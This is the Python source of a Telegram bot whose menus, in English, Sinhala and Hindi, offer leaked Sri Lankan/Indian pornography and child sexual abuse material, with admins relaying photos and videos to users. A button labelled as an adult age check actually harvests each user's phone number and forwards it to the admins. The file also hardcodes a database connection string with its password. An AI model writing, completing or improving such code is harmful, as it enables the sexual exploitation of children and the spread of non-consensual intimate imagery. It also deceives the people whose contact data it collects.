import logging
import os
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ConversationHandler,
    CallbackContext,
    filters,
)
from pymongo import MongoClient
from pymongo.errors import ConnectionFailure  # Fixed import

# Enable logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Define states for the conversation handler
PHONE_REQUEST, LANGUAGE_SELECTION, MAIN_MENU, CATEGORY_REDIRECTION = range(4)

# MongoDB setup (use environment variable for security)
MONGO_URI = "mongodb+srv://utbot:ubot1245@tstring.orxvfpm.mongodb.net/?appName=Tstring"
client = MongoClient(MONGO_URI)
db = client['telegram_bot']
users_collection = db['users']  # Store user data: user_id, phone, language, chat_id
active_chats_collection = db['active_chats']  # Store active user-admin pairs

# Admin IDs (replace with actual admin Telegram chat IDs)
admin_ids = [6581573267, 7827015238]

# Provided menu texts for each language (replace with your actual menu texts)
MENUS = {
    'en': {
        'welcome': "Welcome to our bot! Please choose a category or exit.",
        'category1': "Sri Lankan/Indian Leak P0RN",
        'category2': "CH!1D P0RN",
        'exit': "Exit",
        'admin_message': "New user chat initiated. User phone: {phone}",
        'chat_closed': "Chat has been closed by admin.",
        'select_language': "Please select your language:",
        'phone_prompt': "ONLY 18+ ADULTS ALLOWED TO JOIN THIS NETWORK.",
        'phone_denied': "YOY MUST ALLOW TO SHARE YOUR AGE TO JOIN THIS NETWORK. Please try again with /start.",
        'share_button': "IAM 18+ ADULT"
    },
    'si': {
        'welcome': "අපගේ බොට් වෙත සාදරයෙන් පිළිගනිමු! කරුණාකර කාණ්ඩයක් තෝරන්න හෝ පිටවන්න.",
        'category1': "ශ්‍රීලංකාවේ/ඉන්දියාවේ ලීක් වීඩියෝ ",
        'category2': "ළමා වීඩියෝ",
        'exit': "පිටවීම",
        'admin_message': "නව පරිශීලක චැට් ආරම්භ විය. පරිශීලක දුරකථනය: {phone}",
        'chat_closed': "චැට් ඇඩ්මින් විසින් වසා ඇත.",
        'select_language': "කරුණාකර ඔබේ භාෂාව තෝරන්න:",
        'phone_prompt': "ඉදිරියට යාම, වයස 18+ වැඩිහිටියන්ට පමණකි.",
        'phone_denied': "ඔබ ඉදිරියට යාමට ඔබගේ සත්‍ය වයස අප හා බෙදාගැනීමට එකඟ වියයුතුමය. කරුණාකර /start සමඟ නැවත උත්සාහ කරන්න.",
        'share_button': "මම 18+ වැඩිහිටියෙක්මි"
    },
    'hi': {
        'welcome': "हमारे बॉट में आपका स्वागत है! कृपया एक श्रेणी चुनें या बाहर निकलें।",
        'category1': "Sri Lankan/Indian Leak P0RN",
        'category2': "बच्चों के वीडियो",
        'exit': "बाहर निकलें",
        'admin_message': "नया उपयोगकर्ता चैट शुरू हुआ। उपयोगकर्ता फोन: {phone}",
        'chat_closed': "चैट को व्यवस्थापक द्वारा बंद कर दिया गया है।",
        'select_language': "कृपया अपनी भाषा चुनें:",
        'phone_prompt': "कार्यवाही केवल 18+ आयु वर्ग के वयस्कों के लिए है।",
        'phone_denied': "जारी रखने के लिए आपको अपनी वास्तविक आयु हमसे साझा करने की सहमति देनी होगी। कृपया /start के साथ पुनः प्रयास करें",
        'share_button': "मैं 18+ आयु का वयस्क हूं।"
    }
}

# Language options
LANGUAGES = {
    'en': 'English',
    'si': 'Sinhala',
    'hi': 'Hindi'
}

async def start(update: Update, context: CallbackContext) -> int:
    """Start the bot and present a 'Share My Phone Number' button to trigger the phone number popup."""
    user_id = update.effective_user.id
    
    # Initialize user data in MongoDB if not exists
    users_collection.update_one(
        {'user_id': user_id},
        {'$setOnInsert': {'chat_id': update.effective_chat.id}},
        upsert=True
    )

    # Create a keyboard with a 'Share My Phone Number' button
    keyboard = [[KeyboardButton(MENUS['en']['share_button'], request_contact=True)]]
    reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=True, resize_keyboard=True)
    
    # Send message to inform user about phone number sharing
    await update.message.reply_text(
        MENUS['en']['phone_prompt'],
        reply_markup=reply_markup
    )
    return PHONE_REQUEST

async def receive_phone(update: Update, context: CallbackContext) -> int:
    """Handle the phone number received from the Telegram popup."""
    user_id = update.effective_user.id
    contact = update.message.contact
    if contact and contact.phone_number:
        # Store phone number in MongoDB
        users_collection.update_one(
            {'user_id': user_id},
            {'$set': {'phone': contact.phone_number}}
        )
        # Show language selection menu
        keyboard = [[lang] for lang in LANGUAGES.values()]
        reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=True, resize_keyboard=True)
        await update.message.reply_text(
            MENUS['en']['select_language'],
            reply_markup=reply_markup
        )
        return LANGUAGE_SELECTION
    else:
        # If the user sends something other than a contact or denies the popup
        await update.message.reply_text(
            MENUS['en']['phone_denied'],
            reply_markup=ReplyKeyboardRemove()
        )
        return ConversationHandler.END

async def select_language(update: Update, context: CallbackContext) -> int:
    """Handle language selection and show main menu."""
    user_id = update.effective_user.id
    selected_lang = update.message.text
    # Map selected language to code
    lang_code = next((code for code, name in LANGUAGES.items() if name.lower() == selected_lang.lower()), None)
    
    if lang_code not in LANGUAGES:
        await update.message.reply_text("Invalid language. Please select a valid language.")
        return LANGUAGE_SELECTION
    
    # Store language in MongoDB
    users_collection.update_one(
        {'user_id': user_id},
        {'$set': {'language': lang_code}}
    )
    
    # Show main menu in the selected language
    menu = MENUS[lang_code]
    keyboard = [
        [menu['category1'], menu['category2']],
        [menu['exit']]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=True, resize_keyboard=True)
    await update.message.reply_text(menu['welcome'], reply_markup=reply_markup)
    return MAIN_MENU

async def main_menu(update: Update, context: CallbackContext) -> int:
    """Handle main menu options: redirect to admin or exit."""
    user_id = update.effective_user.id
    choice = update.message.text
    
    # Retrieve user data from MongoDB
    user = users_collection.find_one({'user_id': user_id})
    if not user or 'language' not in user:
        await update.message.reply_text("Please start again with /start.")
        return ConversationHandler.END
    
    lang = user['language']
    menu = MENUS[lang]
    
    if choice == menu['exit']:
        await update.message.reply_text("Thank you for using our bot!", reply_markup=ReplyKeyboardRemove())
        return ConversationHandler.END
    
    if choice in [menu['category1'], menu['category2']]:
        # Assign an admin (simple round-robin for now)
        admin_id = admin_ids[0]  # Replace with logic to select admin if needed
        
        # Store active chat in MongoDB
        active_chats_collection.update_one(
            {'user_id': user_id},
            {'$set': {'admin_id': admin_id}},
            upsert=True
        )
        
        # Send user info to admin
        admin_message = menu['admin_message'].format(phone=user['phone'])
        await context.bot.send_message(
            chat_id=admin_id,
            text=f"{admin_message}\nUser ID: {user_id}"
        )
        await update.message.reply_text(
            f"You selected {choice}. An admin will assist you shortly.",
            reply_markup=ReplyKeyboardRemove()
        )
        return CATEGORY_REDIRECTION
    else:
        await update.message.reply_text("Please select a valid option.")
        return MAIN_MENU

async def forward_to_admin(update: Update, context: CallbackContext) -> None:
    """Forward user messages to the assigned admin."""
    user_id = update.effective_user.id
    
    # Check if user has an active chat
    active_chat = active_chats_collection.find_one({'user_id': user_id})
    if active_chat:
        admin_id = active_chat['admin_id']
        user = users_collection.find_one({'user_id': user_id})
        if update.message.text:
            await context.bot.send_message(
                chat_id=admin_id,
                text=f"From user {user['phone']}: {update.message.text}"
            )
        elif update.message.photo:
            await context.bot.send_photo(
                chat_id=admin_id,
                photo=update.message.photo[-1].file_id,
                caption=f"From user {user['phone']}"
            )
        elif update.message.video:
            await context.bot.send_video(
                chat_id=admin_id,
                video=update.message.video.file_id,
                caption=f"From user {user['phone']}"
            )
        # Add other media types as needed
    else:
        await update.message.reply_text("No active admin session. Please select a category from the main menu.")

async def admin_reply(update: Update, context: CallbackContext) -> None:
    """Handle admin replies and forward to the user without prefix/caption."""
    admin_id = update.effective_user.id
    if admin_id not in admin_ids:
        return
    
    if not context.args:
        await update.message.reply_text("Please provide a user ID and message. Format: /reply <user_id> <message>")
        return
    
    try:
        user_id = int(context.args[0])
        message = ' '.join(context.args[1:])
        
        # Check if user exists and has an active chat
        user = users_collection.find_one({'user_id': user_id})
        active_chat = active_chats_collection.find_one({'user_id': user_id})
        if not user or not active_chat:
            await update.message.reply_text("Invalid user ID or no active chat.")
            return
        
        if message.lower() == "close":
            # Close the chat
            lang = user['language']
            await context.bot.send_message(
                chat_id=user['chat_id'],
                text=MENUS[lang]['chat_closed']
            )
            active_chats_collection.delete_one({'user_id': user_id})
            await update.message.reply_text("Chat closed.")
            return
        
        # Forward admin message to user without prefix/caption
        if update.message.text:
            await context.bot.send_message(
                chat_id=user['chat_id'],
                text=message
            )
        elif update.message.photo:
            await context.bot.send_photo(
                chat_id=user['chat_id'],
                photo=update.message.photo[-1].file_id
                # No caption
            )
        elif update.message.video:
            await context.bot.send_video(
                chat_id=user['chat_id'],
                video=update.message.video.file_id
                # No caption
            )
        # Add other media types as needed
    except (IndexError, ValueError):
        await update.message.reply_text("Invalid format. Use: /reply <user_id> <message>")

async def error_handler(update: Update, context: CallbackContext) -> None:
    """Log errors caused by updates."""
    logger.error(f"Update {update} caused error {context.error}")

def main() -> None:
    """Run the bot."""
    # Use environment variable for bot token
    bot_token = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN")
    application = Application.builder().token(bot_token).build()

    # Define conversation handler
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            PHONE_REQUEST: [MessageHandler(filters.CONTACT, receive_phone)],
            LANGUAGE_SELECTION: [MessageHandler(filters.TEXT & ~filters.COMMAND, select_language)],
            MAIN_MENU: [MessageHandler(filters.TEXT & ~filters.COMMAND, main_menu)],
            CATEGORY_REDIRECTION: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, forward_to_admin),
                MessageHandler(filters.PHOTO, forward_to_admin),
                MessageHandler(filters.VIDEO, forward_to_admin),
            ],
        },
        fallbacks=[],
    )

    # Add handlers
    application.add_handler(conv_handler)
    application.add_handler(CommandHandler('reply', admin_reply))
    application.add_handler(MessageHandler(filters.PHOTO & filters.User(user_ids=admin_ids), admin_reply))
    application.add_handler(MessageHandler(filters.VIDEO & filters.User(user_ids=admin_ids), admin_reply))
    application.add_error_handler(error_handler)

    # Start the bot
    try:
        application.run_polling()
    finally:
        client.close()  # Close MongoDB connection when bot stops

if __name__ == '__main__':
    main()
